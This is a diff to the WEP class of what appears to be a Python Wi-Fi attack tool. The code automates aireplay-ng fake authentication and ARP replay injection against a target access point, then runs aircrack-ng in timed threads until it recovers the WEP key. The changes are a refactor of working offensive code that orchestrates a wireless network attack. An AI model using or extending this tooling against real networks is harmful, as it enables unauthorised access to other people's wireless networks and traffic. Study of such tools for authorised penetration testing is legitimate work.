@@ -47,7 +47,7 @@ class WEP(EncryptionType):
 
             fakeauth_out, err = self.execute_command(fakeauth_cmd)
             self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
-            self.show_message(fakeauth_out.decode('utf-8'))
+            # self.show_message(fakeauth_out.decode('utf-8'))
 
             arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
             arpreplay_thread.start()
@@ -59,15 +59,16 @@ class WEP(EncryptionType):
         else:
             super().show_message("Running silent attack (no fake auth and no arp replay)")
 
-        password = ""
+        self.password = ""
 
         pgrep_aireplay_cmd = ['pgrep', 'aireplay']
 
-        while password == "":
-            password = self.crack_network()
-
-            if not self.silent_attack:
-                if counter == 10:
+        while self.password == "":
+            crack_thread = threading.Thread(target=self.crack_network)
+            crack_thread.start()
+            time.sleep(10)
+            if not self.silent_attack and self.password == "":
+                if counter == 2:
                     self.show_message("Reseting aireplay every 20 seconds . . .")
                     pgrep_out, err = self.execute_command(pgrep_aireplay_cmd)
 
@@ -81,7 +82,7 @@ class WEP(EncryptionType):
 
                     fakeauth_out, err = self.execute_command(fakeauth_cmd)
                     self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
-                    self.show_message(fakeauth_out.decode('utf-8'))
+                    # self.show_message(fakeauth_out.decode('utf-8'))
                     arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
                     arpreplay_thread.start()
                     arpreplay_thread.join(0)
@@ -89,8 +90,7 @@ class WEP(EncryptionType):
                     counter = 0
                 else:
                     counter+=1
-            time.sleep(2)
-        return password
+        return self.password
 
     def crack_network(self):
         """
@@ -99,18 +99,12 @@ class WEP(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
-                        '>', self.write_directory + '/aircrack-out_' + str(self.timestamp)]
-        self.show_message("---------Executing aircrack-----------")
-        aircrack_thread = threading.Thread(target=self.execute_command, args=(aircrack_cmd,))
-        aircrack_thread.start()
-        aircrack_thread.join()
-
         password = ""
+        aircrack_cmd = ['timeout', '10', 'aircrack-ng',
+                        self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
+                        '>', self.write_directory + '/aircrack-out_' + str(self.timestamp)]
+        self.show_message("Running aircrack thread")
+        out, err = self.execute_command(aircrack_cmd)
+        password = self.filter_aircrack(out.decode("utf-8"))
 
-        while password != "":
-            with open(self.write_directory + '/aircrack-out_' + str(self.timestamp), 'r') as aircrack_out:
-                self.password = self.filter_aircrack(aircrack_out.read())
-            time.sleep(1)
-        self.show_message("--------------------------------------")
-        return self.password
+        self.password = password
